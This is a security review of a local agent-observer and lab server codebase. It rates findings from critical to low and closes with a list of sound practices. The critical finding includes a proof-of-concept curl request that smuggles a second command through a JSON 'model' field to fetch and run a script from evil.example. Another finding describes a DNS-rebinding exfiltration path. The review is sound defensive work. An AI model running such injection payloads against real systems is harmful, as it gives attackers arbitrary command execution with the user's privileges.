# Security review

**Overall verdict: HIGH RISK.** The observer half is genuinely well defended (argv-only subprocesses, double-gated path handling, no HTML injection sinks, loopback binding, thoughtful Host/Origin guard). But one route — `POST /api/lab/launch` — is reachable from any local process without the capability token and passes a request-controlled `model` string into a **shell command line**, yielding arbitrary command execution as the user. It also flatly contradicts SECURITY.md's central claim that the laboratory is "never [reachable] from the server or the UI."

## Findings

**CRITICAL — `packages/server/src/lab/fork.ts:120` + `packages/server/src/api/lab.ts:532` — unauthenticated shell injection via the launch route's `model` field.**
`workmuxAddArgv` interpolates the treatment's model into a shell string: `argv.push('-a', \`bash scripts/lane-agent.sh ${treatment.model}\`)`, then `fork.ts:277` runs `workmux add … -a "bash scripts/lane-agent.sh <model>"`, and workmux executes that string in a tmux pane shell. `model` arrives verbatim from the HTTP body of `POST /api/lab/launch` (`api/lab.ts` `parseLaunchRequestBody` only checks `typeof === 'string'`; `launchExperiment` pushes `--model <model>` into the in-process CLI argv). Exploit path: any process on the machine (a compromised dependency, another tool, any local user) runs:
`curl -X POST http://127.0.0.1:4321/api/lab/launch -H 'Content-Type: application/json' -d '{"lane":"<existing-lane>","checkpointId":"<id>","arms":[{"model":"x; curl evil.example/s.sh|sh; #"}]}'`
No Origin header is sent by curl, so the mutation guard passes it; the route never calls `requireCapabilityToken` (confirmed: only `api/label.ts:38` does). The injected command runs in a new tmux pane with the user's full privileges. Fix: (1) apply `requireCapabilityToken` to this route (the code comments admit adoption is incomplete — "follow-up"); (2) validate `model` against `^[A-Za-z0-9._-]+$` or pass it as a separate argv element and export it (e.g. `MODEL=…` env) instead of interpolating into a shell string.

**HIGH — `packages/server/src/server/mutation-guard.ts:70` — read routes have no Host check → DNS-rebinding exfiltration.**
`MUTATING_METHODS` excludes GET, and the module's own doc justifies this by claiming a cross-origin GET "would need a same-origin response read, which the browser's own CORS enforcement already blocks." That is exactly wrong under the DNS-rebinding scenario the same file describes for POST: after `evil.example` rebinds to 127.0.0.1, the browser treats `http://evil.example:4321/api/transcript/...` as *same-origin*, so the attacker's page can read full responses — agent transcripts, session logs, `/api/stream` SSE (EventSource streams continuously), file contents agents touched (which can include secrets from the operator's repos) — and POST them anywhere. The server sends no CORS headers, but rebinding needs none. Fix: extend the loopback `Host` check to all methods (the file already notes this is a one-line change); also reject `Sec-Fetch-Site: cross-site` on GETs as defense-in-depth.

**MEDIUM — `packages/server/src/api/rotate.ts:25` — mutating route without the capability token.**
`POST /api/rotate` relies solely on the Host/Origin/Content-Type guard. Any local non-browser process can force session rotation (closes the live recording, rewrites boot meta) at will. Not RCE, but an unauthenticated state-changing write the token mechanism was built for. Fix: add `preHandler: requireCapabilityToken(ctx.capabilityToken)`, same as label.

**MEDIUM — `SECURITY.md` vs. code — the "lab is CLI-only" claim is false.**
SECURITY.md states the laboratory is "reachable only from your own command line (`rhizomorph lab checkpoint`/`fork`/`compare`), never from the server or the UI," and `api/lab.ts`'s own doc claims the "explicit-invocation law" is preserved because it calls `runCli(['lab','fork',…])` in-process. That is lawyering: an unauthenticated HTTP POST reaches `dispatchFork --launch`, which runs `git worktree add` and `workmux add` (branch + tmux pane + agent spend). The "second hand" fence described in SECURITY.md does not exist at the HTTP layer. Fix: gate the route with the token and correct SECURITY.md.

**LOW — `packages/server/src/server/static.ts:33` — prefix check without path separator.**
`requested.startsWith(root)` after `path.resolve` would pass a sibling like `<root>-evil/…` (`/a/dist2/x` starts with `/a/dist`). Not exploitable today (an attacker can't create sibling directories via HTTP, and a missing file falls back to index.html), but compare against `root + path.sep` like `transcript-attribution.ts:167` does.

**LOW — `packages/server/src/api/otel.ts` — OTLP "instance identity" is not a secret.**
The receiver refuses foreign posts by requiring `instance === recorder.sessionId`, but that id is published on unauthenticated `GET /api/meta`, so any local process can read it and inject forged `llm.cost`/`trace.span`/`agent.activeTime` events into the permanent record. Acceptable as misconfiguration detection (its stated purpose), but it is not integrity protection; don't describe it as one.

## Done correctly

- **Subprocess spawning is uniformly argv-form.** `server/exec.ts` uses `execFile` only; every collector call site (`git-collector.ts`, `tmux/collector.ts:76,102`, `workmux/collector.ts:73,88`, `judge/mergetree.ts:72`, `judge/symbols.ts:95`, `lab/git.ts`) passes literal argv arrays — no shell strings anywhere in the observer. Git revision args like `` `${mainBranch}...${branch}` `` are safe because git refnames can't begin with `-` or contain `..`.
- **Path traversal is well defended.** `isSafeSessionId` + `isPathContained` double-gate transcript paths (`log/transcript-attribution.ts:153–168`); `/api/sessions/:id/events` coerces the id through `Number()` (`log/session-log.ts:92`), neutralizing `../`; the lab's worktree writes go through `assertInsideLabWorktrees` with symlink-aware canonicalization (`lab/paths.ts`).
- **No XSS sinks.** React-only rendering; zero `dangerouslySetInnerHTML`/`innerHTML`/markdown libs in `packages/web`; the only `href` assignment is a blob URL.
- **Binding & CSRF.** Hard-coded `host: '127.0.0.1'` (`cli/run.ts:160`, `cli/replay.ts:180`); the mutation guard's Host+Origin+Content-Type checks genuinely stop browser-originated CSRF/rebind POSTs; the capability token is minted per-process, never logged, length-checked before comparison.
- The observer's read-only claim over the watched repo **holds** for collectors; the broken fence is specifically the lab launch route above.
